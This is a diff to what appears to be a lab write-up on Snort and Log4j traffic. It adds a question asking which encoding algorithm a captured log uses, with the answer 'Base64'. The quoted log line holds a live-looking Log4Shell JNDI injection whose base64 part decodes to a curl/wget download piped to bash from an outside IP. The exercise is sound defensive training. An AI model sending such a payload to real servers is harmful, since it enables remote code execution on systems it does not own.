@@ -967,3 +967,20 @@ snort -c local-1.rules -A full -l . -r log4j.pcap
 > 41 {.answer .blur} 
 
 [Reveal Answer](#) {.reveal-answer .btn .btn-primary}
+
+#### Question 5
+
+Investigate the log/alarm files.
+
+What is the name of the used encoding algorithm?
+
+##### Notes
+
+Quick read of the log file and I noticed this
+
+> ^v^D�c���GET /?x=${jndi:ldap://45.155.205.233:12344/Basic/Command/??????/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=} HTTP/1.1
+
+#### Answer
+> Base64 {.answer .blur} 
+
+[Reveal Answer](#) {.reveal-answer .btn .btn-primary}
